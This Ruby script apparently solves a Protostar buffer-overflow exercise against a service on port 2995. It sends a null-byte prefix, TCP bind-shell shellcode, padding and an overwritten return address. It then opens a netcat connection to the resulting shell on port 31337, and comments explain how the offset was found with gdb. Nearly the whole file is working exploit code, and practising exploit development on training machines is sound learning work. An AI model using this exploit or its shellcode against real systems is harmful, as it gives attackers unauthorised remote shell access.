#!/usr/bin/ruby

require 'socket'

puts "> Enter hostname:"
hostname = gets.chomp
port = 2995
socket = TCPSocket.open(hostname, port)

# ruby -e 'puts "A" * 512 + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" ' | nc localhost 2995
# then use gdb to open core dump file
# we can find:
# gets(buffer) start at: 0xbffffa48
# when Segmentation fault, eip is: 0x58575655
# ^ which is UVWX
# ^ so 0xbffffa48 + (512 + 20) will be the return pointer

# The strlen() function returns the number of characters that precede the terminating NUL character
# we will use null byte to trick strlen
# so that the toupper(buffer[i]) will not be executed
null_byte = "\x00\x00\x00\x00"

# Shell Bind TCP Shellcode Port 1337 - 89 bytes
# http://shell-storm.org/shellcode/files/shellcode-882.php
#shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

# tcpbindshell  (108 bytes)
# http://shell-storm.org/shellcode/files/shellcode-847.php
PORTHL = "\x7a\x69" # default is \x7a\x69 = 31337
shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68" +
PORTHL + "\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"

# gets(buffer) start at: 0xbffffa48
# 0xbffffa48 + null_byte.length (which is 4 bytes) = 0xbffffa4c
shellcode_addr = "\x4c\xfa\xff\xbf"

# String#length: Returns the count of characters (not bytes) in self
# String#bytesize: Returns the count of bytes in self
# in protostar, ruby version is 1.8.7 and the result of shellcode.length is 108 (which is correct)
# however if your ruby is newer like 2.6.8 than the result of shellcode.length is 98 (much smaller)
# shellcode.bytesize has the same result in two different versions of Ruby
padding = "A" * (532 - null_byte.bytesize - shellcode.bytesize) + shellcode_addr

response = null_byte + shellcode + padding + shellcode_addr
socket.puts(response)

command = <<-END
nc -v #{hostname} #{PORTHL.unpack("n")[0]}
END

puts "> exec: #{command}"
puts "> Do not use `exit` in the shell or the port will be inaccessible for a certain period of time"
puts "> Use Control+C instead"
system(command)

puts "> END"
socket.close
